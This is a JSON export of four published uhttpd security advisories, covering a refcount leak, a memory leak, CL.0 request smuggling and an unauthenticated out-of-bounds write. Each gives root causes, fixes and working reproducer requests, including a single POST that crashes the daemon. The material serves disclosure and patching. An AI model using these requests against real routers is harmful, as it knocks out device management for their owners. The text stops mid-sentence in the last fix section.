@@ -1,0 +1,960 @@
+[
+  {
+    "ghsa_id": "GHSA-wvgh-cm54-q6f6",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-wvgh-cm54-q6f6",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-wvgh-cm54-q6f6",
+    "summary": "uhttpd: leaked client refcount on /ubus/subscribe/ — permanent listener wedge",
+    "description": "## Summary\r\n\r\n`uh_ubus_handle_get_subscribe()` takes a client reference and never releases it on the success\r\npath. `uh_client_unref()` is reached only via `err_unref`/`err_unregister`, so after a successful\r\nsubscribe `cl->refcount` stays ≥1 forever.\r\n\r\n```c\r\nuh_client_ref(cl);\r\nerr = ubus_register_subscriber(ctx, &du->sub);\r\n...\r\ncl->dispatch.free = uh_ubus_subscription_free;\r\nreturn;                    /* no uh_client_unref() */\r\nerr_unregister:\r\n        ubus_unregister_subscriber(ctx, &du->sub);\r\nerr_unref:\r\n        uh_client_unref(cl);\r\n```\r\n\r\nWhen the peer disconnects, `client_close()` takes its early-return branch permanently:\r\n\r\n```c\r\nif (cl->refcount) {\r\n        cl->state = CLIENT_STATE_CLEANUP;\r\n        return;\r\n}\r\n...\r\nuh_dispatch_done(cl);\r\n```\r\n\r\nSo `n_clients` is never decremented, the fd is never closed, `cl` is never freed, and\r\n`uh_dispatch_done()` → `uh_ubus_subscription_free()` **never runs** — commit `506e249`\r\n(\"unregister ubus subscriber on HTTP client disconnect\") is dead code on exactly the path it was\r\nwritten for, and the ubus subscriber leaks in the global context.\r\n\r\n## Impact\r\n\r\n`conf.max_connections` defaults to 100. After 100 subscribe-then-disconnect requests\r\n`uh_block_listeners()` stops uhttpd accepting anything — persistent HTTP DoS until restart.\r\n\r\nReproduced with `uhttpd -N 3`:\r\n\r\n```\r\nbaseline before subscribes:  probe0: b'HTTP/1.1 200 OK\\r\\nCon'\r\n  subscribe #1..#3 sent and disconnected\r\nafter 3 subscribe+disconnect (N=3):  probe1: FAILED timed out\r\nVERDICT: *** LISTENER WEDGED - permanent DoS ***\r\n```\r\n\r\n```\r\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H   -> 6.5 Moderate\r\n```\r\n\r\n## Reachability — stated precisely\r\n\r\nGated by `uh_ubus_allowed(sid, path, \":subscribe\")`. rpcd's `unauthenticated.json` grants the null\r\nsession only `session.access` / `session.login`, so on a stock box this is **post-auth**: it needs\r\nany session whose ACL grants the object, or `ubus_noauth`. I used `-a` to reach the handler in the\r\nreproducer above.\r\n\r\n**However** — `uh_ubus_allowed()` fnmatches the method as the subject against the ACL pattern, so\r\nan ACL granting `[\"*\"]` for an object also grants `:subscribe`. Enumerating the LuCI feed, 13\r\nACLs do this, and one of them — `luci-app-olsr-unauthenticated.json` — grants it to the\r\n**`unauthenticated`** group:\r\n\r\n```json\r\n\"unauthenticated\": { \"read\": { \"ubus\": { \"luci-rpc\": [ \"*\" ] } } }\r\n```\r\n\r\nWith `luci-app-olsr` installed, `GET /ubus/subscribe/luci-rpc` wedges the listener **pre-auth**.\r\nThat is a non-default package so I am not scoring on it, but it is worth knowing that `[\"*\"]`\r\nmethod grants silently include `:subscribe`.\r\n\r\n## Note for whoever fixes it\r\n\r\n`506e249`'s SIGSEGV fix is currently load-bearing **because** of this leak — the client is never\r\nfreed, so the stale subscriber cannot use-after-free. Adding the missing unref without keeping\r\n`dispatch.free` reachable would reintroduce that crash.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jow-",
+      "id": 2528802,
+      "node_id": "MDQ6VXNlcjI1Mjg4MDI=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/2528802?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jow-",
+      "html_url": "https://github.com/jow-",
+      "followers_url": "https://api.github.com/users/jow-/followers",
+      "following_url": "https://api.github.com/users/jow-/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jow-/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jow-/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jow-/subscriptions",
+      "organizations_url": "https://api.github.com/users/jow-/orgs",
+      "repos_url": "https://api.github.com/users/jow-/repos",
+      "events_url": "https://api.github.com/users/jow-/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jow-/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-wvgh-cm54-q6f6",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:49:46Z",
+    "published_at": "2026-08-03T08:25:50Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "uhttpd"
+        },
+        "vulnerable_version_range": "see description",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/3c48b9e17d2086f9756b97e5825c2ebdf3ed233a",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+        "score": 6.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-911",
+        "name": "Improper Update of Reference Count"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-911"
+    ],
+    "credits": [
+      {
+        "login": "JuliusBairaktaris",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "JuliusBairaktaris",
+          "id": 33199500,
+          "node_id": "MDQ6VXNlcjMzMTk5NTAw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33199500?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/JuliusBairaktaris",
+          "html_url": "https://github.com/JuliusBairaktaris",
+          "followers_url": "https://api.github.com/users/JuliusBairaktaris/followers",
+          "following_url": "https://api.github.com/users/JuliusBairaktaris/following{/other_user}",
+          "gists_url": "https://api.github.com/users/JuliusBairaktaris/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/JuliusBairaktaris/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/JuliusBairaktaris/subscriptions",
+          "organizations_url": "https://api.github.com/users/JuliusBairaktaris/orgs",
+          "repos_url": "https://api.github.com/users/JuliusBairaktaris/repos",
+          "events_url": "https://api.github.com/users/JuliusBairaktaris/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/JuliusBairaktaris/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "score": 6.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-83vv-qrc6-h3hx",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-83vv-qrc6-h3hx",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-83vv-qrc6-h3hx",
+    "summary": "uhttpd: unauthenticated unbounded memory growth — du->url_path leaked on every non-POST /ubus request",
+    "description": "## Summary\r\n\r\n`uh_ubus_handle_request()` does `du->url_path = strdup(url)` for every method, but only the POST\r\nbranch installs `d->free = uh_ubus_request_free` — the only thing that frees it. Every other\r\nbranch reaches `ops->request_done()` → `uh_request_done()` →\r\n`memset(&cl->dispatch, 0, sizeof(cl->dispatch))`, which **NULLs `du->url_path` without freeing\r\nit**. The trailing `free(du->url_path)` at the end of the function then frees NULL.\r\n\r\nLeak is `strlen(request-target) + 1` per request, bounded per request only by the 4096-byte\r\nustream buffer, and unbounded in aggregate — one keep-alive socket loops it. No authentication.\r\n\r\n## Affected paths\r\n\r\n```\r\nGET /ubus/AAAA…(3900 A's) HTTP/1.1     (404 branch)\r\nGET /ubus/list                          (200 branch)\r\nOPTIONS /ubus\r\nHEAD /ubus                              (400 via uh_client_error)\r\n```\r\n\r\n`GET /ubus/subscribe/<path>` is the one non-POST path that does **not** leak — it returns without\r\ncalling `request_done()`, so the trailing `free()` runs on a live pointer.\r\n\r\n## Measurement\r\n\r\nSame pid throughout, ASan build:\r\n\r\n```\r\nRSS start = 8560 kB\r\nsent 5000 requests (~18.6 MB of raw leak)\r\nRSS end  = 35836 kB      delta = +27.3 MB\r\n```\r\n\r\n## Impact\r\n\r\nRemote unauthenticated OOM of uhttpd, and on a small router of the box. The `/ubus/list` variant\r\nneeds no valid object and no session at all.\r\n\r\n```\r\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H   -> 7.5 High\r\n```\r\n\r\n## Not a duplicate\r\n\r\n`GHSA-vhx4-3p5q-m59q` is also a memory-exhaustion DoS, but it is header accumulation into\r\n`cl->hdr` — bounded per connection by the blob length mask and reclaimed when the connection\r\ncloses. This leak is permanent for the life of the process and is driven by the request target,\r\nnot by headers. Different allocation, different lifetime, different fix.\r\n\r\n## Fix\r\n\r\nFree `url_path` on all non-POST paths, or set `d->free` unconditionally.",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jow-",
+      "id": 2528802,
+      "node_id": "MDQ6VXNlcjI1Mjg4MDI=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/2528802?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jow-",
+      "html_url": "https://github.com/jow-",
+      "followers_url": "https://api.github.com/users/jow-/followers",
+      "following_url": "https://api.github.com/users/jow-/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jow-/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jow-/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jow-/subscriptions",
+      "organizations_url": "https://api.github.com/users/jow-/orgs",
+      "repos_url": "https://api.github.com/users/jow-/repos",
+      "events_url": "https://api.github.com/users/jow-/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jow-/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-83vv-qrc6-h3hx",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:47:42Z",
+    "published_at": "2026-08-03T08:05:48Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "uhttpd"
+        },
+        "vulnerable_version_range": "see description",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/42e30caa704e4e6e28fc7412e0006959eb247c44",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-401",
+        "name": "Missing Release of Memory after Effective Lifetime"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-401"
+    ],
+    "credits": [
+      {
+        "login": "JuliusBairaktaris",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "JuliusBairaktaris",
+          "id": 33199500,
+          "node_id": "MDQ6VXNlcjMzMTk5NTAw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33199500?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/JuliusBairaktaris",
+          "html_url": "https://github.com/JuliusBairaktaris",
+          "followers_url": "https://api.github.com/users/JuliusBairaktaris/followers",
+          "following_url": "https://api.github.com/users/JuliusBairaktaris/following{/other_user}",
+          "gists_url": "https://api.github.com/users/JuliusBairaktaris/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/JuliusBairaktaris/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/JuliusBairaktaris/subscriptions",
+          "organizations_url": "https://api.github.com/users/JuliusBairaktaris/orgs",
+          "repos_url": "https://api.github.com/users/JuliusBairaktaris/repos",
+          "events_url": "https://api.github.com/users/JuliusBairaktaris/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/JuliusBairaktaris/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "score": 7.5
+    }
+  },
+  {
+    "ghsa_id": "GHSA-c2wg-hcff-hqrm",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-c2wg-hcff-hqrm",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-c2wg-hcff-hqrm",
+    "summary": "uhttpd: pre-auth HTTP request smuggling (CL.0) — keep-alive connection reused with an unread request body",
+    "description": "## Summary\r\n\r\n`uh_request_done()` returns a connection to `CLIENT_STATE_INIT` for keep-alive reuse without\r\nchecking whether the request body was consumed. `client_poll_post_data()` bails out early for\r\nevery handler that does not consume body data, so an unauthenticated client can send **one**\r\nwell-formed HTTP/1.1 message whose body the server parses as a **second** request.\r\n\r\nNo authentication, no ACL, no non-default option. It fires on a plain `GET /`.\r\n\r\n## Affected code\r\n\r\n`client.c`, unchanged in substance since 2013 and byte-identical in `f682cca` (HEAD) and\r\n`7b1bec45` (OpenWrt's pin):\r\n\r\n```c\r\nvoid uh_request_done(struct client *cl)\r\n{\r\n        uh_chunk_eof(cl);\r\n        uh_dispatch_done(cl);\r\n        blob_buf_init(&cl->hdr_response, 0);\r\n        memset(&cl->dispatch, 0, sizeof(cl->dispatch));\r\n\r\n        if (!conf.http_keepalive || cl->request.connection_close)\r\n                return uh_connection_close(cl);\r\n\r\n        cl->state = CLIENT_STATE_INIT;   /* reuse: body may still be buffered */\r\n        cl->requests++;\r\n        uh_poll_connection(cl);\r\n}\r\n```\r\n\r\nThe body is left behind here:\r\n\r\n```c\r\nbuf = ustream_get_read_buf(cl->us, &len);\r\nif (!buf || !len)\r\n        break;\r\n\r\nif (!d->data_send)\r\n        return;          /* body left in the ustream, unconsumed */\r\n```\r\n\r\n`d->data_send` is set in exactly two places tree-wide — `ubus.c` (POST to `/ubus`) and `proc.c`\r\n(CGI). Every other handler leaves it NULL: static files, HEAD, directory listings,\r\n304/precondition, and `GET`/`OPTIONS /ubus`.\r\n\r\n`uh_client_error()` already has the guard, and its comment describes precisely the bug the\r\nsuccess path has:\r\n\r\n```c\r\n/* Close the connection even when keep alive is set, when it contains a request\r\n * body, as it was not read and we are currently out of sync. Without handling\r\n * this the body will be interpreted as part of the next request. */\r\nif (r->transfer_chunked || r->content_length > 0)\r\n        cl->request.connection_close = true;\r\n```\r\n\r\nKeep-alive is on by default (`http_keepalive = 20`).\r\n\r\n## Reproducer\r\n\r\nOne well-formed HTTP/1.1 message; the 38-byte body is unambiguously a body:\r\n\r\n```\r\nGET /index.html HTTP/1.1\\r\\nHost: a\\r\\nContent-Length: 38\\r\\n\\r\\nGET /POISON.html HTTP/1.1\\r\\nHost: a\\r\\n\\r\\n\r\n```\r\n\r\n```\r\n[A] 1 message w/ 38-byte body -> responses: ['200', '404']\r\n    *** DESYNC (body executed as request) ***\r\n```\r\n\r\nAppending one innocent request shows the queue offset, which persists for the life of the\r\nconnection:\r\n\r\n```\r\n[B] 2 messages (poisoned + victim) -> responses: ['200', '404', '200']\r\n    *** 3 responses for 2 messages = queue offset ***\r\n```\r\n\r\n## Affected set — measured\r\n\r\nThe split falls exactly along `uh_request_done()` vs `uh_client_error()`, which is the strongest\r\nconfirmation of the root cause:\r\n\r\n```\r\nvia uh_request_done()  (success path, UNGUARDED):\r\n  GET /index.html (200)      -> 2 resp ['200','404']   *** DESYNC ***\r\n  HEAD /index.html           -> 2 resp ['200','404']   *** DESYNC ***\r\n  GET /  (index)             -> 2 resp ['200','404']   *** DESYNC ***\r\n  GET /ubus/bogus (ubus 404) -> 2 resp ['404','404']   *** DESYNC ***\r\n  GET /ubus/list  (200)      -> 2 resp ['200','404']   *** DESYNC ***\r\n  OPTIONS /ubus              -> 2 resp ['200','404']   *** DESYNC ***\r\n\r\nvia uh_client_error()  (ALREADY guarded):\r\n  GET /nonexistent.html      -> connection reset       guarded, no desync\r\n```\r\n\r\nNote the asymmetry: the **file handler's** 404 goes through `uh_client_error()` and is safe,\r\nwhile **ubus's own** 404 calls `ops->request_done()` directly and desyncs. \"Error responses are\r\nsafe\" is not a valid summary — only the paths routed through `uh_client_error()` are.\r\n\r\n`Transfer-Encoding: chunked` works in place of `Content-Length`: with `data_send` NULL the chunked\r\nbody is never framed at all.\r\n\r\n## Impact\r\n\r\nTextbook CL.0 desync.\r\n\r\n- Behind any reverse proxy that reuses upstream connections → cross-client request smuggling and\r\n  response-queue poisoning.\r\n- Directly exposed → the attacker desynchronises their own connection and any pipelined request\r\n  on it gets the wrong response.\r\n\r\n```\r\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N   -> 5.3 Moderate\r\n```\r\n\r\nDeliberately conservative: I demonstrated the direct-connection case only. In the proxy-fronted\r\ndeployment this class normally implies (`S:C/C:H/I:H`, ≈9.x), severity is far higher, but I did\r\nnot build that setup so I am not scoring it.\r\n\r\n## Not a duplicate\r\n\r\nEach published advisory patches a different branch of the same class and left the plain success\r\npath untouched:\r\n\r\n| Advisory | Root cause | Overlap |\r\n|---|---|---|\r\n| `GHSA-p55c-rmhc-qfm5` (CVE-2026-55612) | invalid chunk-length state reset | none — no chunked encoding needed here |\r\n| `GHSA-mcfg-c4r7-pjpf` (CVE-2026-55614) | case-sensitive `Transfer-Encoding` | none — plain `Content-Length` |\r\n| `GHSA-wgwp-64hh-f52p` (CVE-2026-55613) | ubus POST body parse-error desync | none — no `/ubus`, no POST, no parse error |\r\n| `GHSA-vhx4-3p5q-m59q` | header-accumulation memory DoS | none |\r\n\r\nI audited a tree with all of the above applied, including the new `CHUNKED_TRAILER` state\r\nmachine, and ran a 9-case byte-level battery against the trailer work specifically — it is\r\ncorrect. This is a path it never covered.\r\n\r\n## Fix\r\n\r\nMove the guard out of `uh_client_error()` into `uh_request_done()`:\r\n\r\n```c\r\nif (r->transfer_chunked || r->content_length > 0)\r\n        cl->request.connection_close = true;\r\n```\r\n\r\nNo-op for genuine pipelining (a drained body leaves both zero), and it makes the copy in\r\n`uh_client_error()` redundant.",
+    "severity": "medium",
+    "author": null,
+    "publisher": {
+      "login": "jow-",
+      "id": 2528802,
+      "node_id": "MDQ6VXNlcjI1Mjg4MDI=",
+      "avatar_url": "https://avatars.githubusercontent.com/u/2528802?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jow-",
+      "html_url": "https://github.com/jow-",
+      "followers_url": "https://api.github.com/users/jow-/followers",
+      "following_url": "https://api.github.com/users/jow-/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jow-/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jow-/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jow-/subscriptions",
+      "organizations_url": "https://api.github.com/users/jow-/orgs",
+      "repos_url": "https://api.github.com/users/jow-/repos",
+      "events_url": "https://api.github.com/users/jow-/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jow-/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-c2wg-hcff-hqrm",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-11-11T23:49:05Z",
+    "published_at": "2026-08-03T08:12:04Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "uhttpd"
+        },
+        "vulnerable_version_range": "see description",
+        "patched_versions": "https://github.com/openwrt/uhttpd/commit/d6205aad61763b5e5d86441164b3aeed83294e7f",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+        "score": 5.3
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-444",
+        "name": "Inconsistent Interpretation of HTTP Requests"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-444"
+    ],
+    "credits": [
+      {
+        "login": "JuliusBairaktaris",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "JuliusBairaktaris",
+          "id": 33199500,
+          "node_id": "MDQ6VXNlcjMzMTk5NTAw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33199500?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/JuliusBairaktaris",
+          "html_url": "https://github.com/JuliusBairaktaris",
+          "followers_url": "https://api.github.com/users/JuliusBairaktaris/followers",
+          "following_url": "https://api.github.com/users/JuliusBairaktaris/following{/other_user}",
+          "gists_url": "https://api.github.com/users/JuliusBairaktaris/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/JuliusBairaktaris/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/JuliusBairaktaris/subscriptions",
+          "organizations_url": "https://api.github.com/users/JuliusBairaktaris/orgs",
+          "repos_url": "https://api.github.com/users/JuliusBairaktaris/repos",
+          "events_url": "https://api.github.com/users/JuliusBairaktaris/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/JuliusBairaktaris/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+      "score": 5.3
+    }
+  },
+  {
+    "ghsa_id": "GHSA-2mpg-6wp5-435p",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/openwrt/uhttpd/security-advisories/GHSA-2mpg-6wp5-435p",
+    "html_url": "https://github.com/openwrt/uhttpd/security/advisories/GHSA-2mpg-6wp5-435p",
+    "summary": "uhttpd: unauthenticated out-of-bounds write via `params` type confusion in POST /ubus/call/",
+    "description": "## Summary\r\n\r\n`uhttpd`'s JSON-RPC policy accepts `params` as **any** blobmsg type, but the REST endpoint\r\n`POST /ubus/call/<object>` hands the raw attribute to `uh_ubus_send_request()`, which iterates\r\nit as if it were a container. A scalar `params` makes the iterator reinterpret 4 bytes of\r\nattacker-controlled payload as a `struct blob_attr` header. The resulting length underflows to\r\n`SIZE_MAX`-class, is truncated to `unsigned int` by `blobmsg_add_field()`, and reaches\r\n`memcpy()` as `0xFFFFFFFD`.\r\n\r\nOne HTTP POST, **no credentials**, kills the daemon.\r\n\r\n## Affected code\r\n\r\n`ubus.c` — byte-identical between `f682cca` (HEAD) and `7b1bec45` (the commit OpenWrt currently\r\npackages), so current OpenWrt is affected exactly as HEAD is.\r\n\r\n```c\r\n[RPC_PARAMS] = { .name = \"params\", .type = BLOBMSG_TYPE_UNSPEC },   /* accepts anything */\r\n```\r\n\r\n`parse_json_rpc()` copies the attribute verbatim with `blob_memdup()`, `uh_ubus_call()` passes it\r\nstraight through, and `uh_ubus_send_request()` assumes a container:\r\n\r\n```c\r\nblobmsg_for_each_attr(cur, args, rem) {\r\n        if (!strcmp(blobmsg_name(cur), \"ubus_rpc_session\"))\r\n                return uh_ubus_json_rpc_error(cl, ERROR_PARAMS);\r\n        blobmsg_add_blob(&req, cur);\r\n}\r\n```\r\n\r\n## The primitive\r\n\r\nWith `\"params\": 1` the attribute is a 20-byte `BLOBMSG_TYPE_INT32`. `blobmsg_data_len()` is 4, so\r\nthe loop guard `rem >= sizeof(struct blob_attr)` passes and the payload bytes `00 00 00 01` are\r\nread as an attribute header:\r\n\r\n- `id_len == 1` ⇒ `blob_len(cur)` = `1 - sizeof(struct blob_attr)` underflows; `blobmsg_data_len(cur)`\r\n  becomes `~0xFFFF…FFFD`.\r\n- `blobmsg_name(cur)` is `blob_data(cur) + 2`, **2 bytes past the 20-byte allocation** — the\r\n  `strcmp` above is already an out-of-bounds read.\r\n- `blobmsg_add_blob()` → `blobmsg_add_field(..., unsigned int len)` truncates the `size_t` to\r\n  `4294967293` and runs `memcpy(data_dest, data, len)`.\r\n\r\nThe behaviour across the whole input range is deterministic and matches the arithmetic exactly:\r\n`params` values whose low 24 bits are **1–3** give the giant `memcpy`; **4** gives the\r\nout-of-bounds read only; **≥5** fails `blob_pad_len(pos) <= rem` and is filtered; **0** fails\r\n`blob_pad_len(pos) >= sizeof(struct blob_attr)`.\r\n\r\n## Why it is unauthenticated\r\n\r\n`uh_ubus_get_auth()` returns `UH_UBUS_DEFAULT_SID` — the null session\r\n`00000000000000000000000000000000` — when no `Authorization: Bearer` header is present. rpcd\r\ngrants that session the `unauthenticated` ACL group unconditionally (`session.c`, returns true\r\nfor the group name when no login section exists), and `rpcd/unauthenticated.json` gives it\r\n`session: [\"access\", \"login\"]`. So `uh_ubus_allowed(sid, \"session\", \"login\")` **passes** and\r\ncontrol reaches the vulnerable loop.\r\n\r\nConfirmed live: a well-formed `login` with a wrong password returns\r\n`{\"code\":6,\"message\":\"Permission denied\"}` — rpcd's own login handler answered, so the ACL gate\r\nwas cleared, not bypassed.\r\n\r\n`/ubus/call/...` is served whenever `ubus_prefix` is set, which is the stock LuCI configuration\r\n(`files/ubus.default` sets `ubus_prefix=/ubus`).\r\n\r\n## Reproducer\r\n\r\nOne POST, zero credentials:\r\n\r\n```http\r\nPOST /ubus/call/session HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Type: application/json\r\nContent-Length: 51\r\n\r\n{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"login\",\"params\":1}\r\n```\r\n\r\n### ASan — the read\r\n\r\n```\r\nERROR: AddressSanitizer: heap-buffer-overflow\r\nREAD of size 1 at 0x7005f89e0296\r\n    #0 strcmp\r\n    #1 uh_ubus_send_request   ubus.c:574\r\n    #2 uh_ubus_call           ubus.c:890\r\n    #3 uh_ubus_handle_post    ubus.c:922\r\n    #4 client_poll_post_data  client.c:674\r\n   #11 uloop_run_events       libubox/uloop.c:255\r\n\r\n0x7005f89e0296 is located 2 bytes after 20-byte region [0x7005f89e0280,0x7005f89e0294)\r\nallocated by thread T0 here:\r\n    #1 blob_memdup            libubox/blob.c:343\r\n    #2 parse_json_rpc         ubus.c:713\r\n```\r\n\r\n### ASan — the write (`-fsanitize-recover=address` to continue past the read)\r\n\r\n```\r\nWRITE of size 4294967293 at 0x77ad9c1e0a00 thread T0\r\n    #0 memcpy\r\n    #2 blobmsg_add_field      libubox/blobmsg.c:412\r\n    #3 uh_ubus_send_request   ubus.c:576\r\n    #4 uh_ubus_call           ubus.c:890\r\n\r\nERROR: AddressSanitizer: SEGV on unknown address 0x77ad9c220000\r\nThe signal is caused by a WRITE memory access.\r\n```\r\n\r\n### Non-sanitised build — the shipped behaviour\r\n\r\nSame stack rebuilt with plain `-O2 -g`, same single request:\r\n\r\n```\r\nalive before : True\r\nalive after  : False\r\nuhttpd exited rc=139   (SIGSEGV)\r\n```\r\n\r\n## Impact\r\n\r\n**Demonstrated:** an unauthenticated remote attacker sends one HTTP POST and uhttpd dies with\r\nSIGSEGV, taking down the entire web management plane. procd respawns it, but the request can be\r\nrepeated at will, so this is a sustained denial of service.\r\n\r\n**Not demonstrated:** controlled corruption. The primitive is a linear ~4 GiB heap write whose\r\nsource bytes are attacker-influenced, which plausibly supports more than a crash — but I did not\r\nbuild a controlled-corruption or code-execution PoC, so I do not score confidentiality or\r\nintegrity impact.\r\n\r\n```\r\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H   -> 7.5 High\r\n```\r\n\r\n`AC:L` because the single request is deterministic and reproduced on every attempt. If you want\r\nthe score re-derived above `A:H`, a controlled-corruption PoC is the work required and I have not\r\ndone it.\r\n\r\n## Not a duplicate\r\n\r\nDistinct from all four published uhttpd advisories, which are all in `client.c` HTTP framing:\r\n`GHSA-vhx4-3p5q-m59q` (header accumulation), `GHSA-wgwp-64hh-f52p` (ubus POST body parse-error\r\ndesync — that one is `uh_ubus_data_send()` and does not involve `params`, `blobmsg_add_blob`,\r\n`uh_ubus_send_request` or `blobmsg_add_field`), `GHSA-p55c-rmhc-qfm5` and `GHSA-mcfg-c4r7-pjpf`\r\n(chunk-length and `Transfer-Encoding` smuggling).\r\n\r\nThe vulnerable loop dates to `3864c08` (\"ubus: deny requests with a `ubus_rpc_session` toplevel\r\nattribute\") — it was added as a *security* check and never type-guarded; only renamed since\r\n(`212f836`).\r\n\r\n## Fix\r\n\r\nThe legacy/batch path already pins the type: `parse_call_params()` declares slot 3 as\r\n`{ .type = BLOBMSG_TYPE_TABLE }`. `uh_ubus_call()` has no equivalent. One guard in\r\n`uh_ubus_send_request()` covers both callers:\r\n\r\n```c\r\nif (args && blobmsg_type(args) != BLOBMSG_TYPE_TABLE)\r\n        return uh_ubus_json_rpc_error(cl, 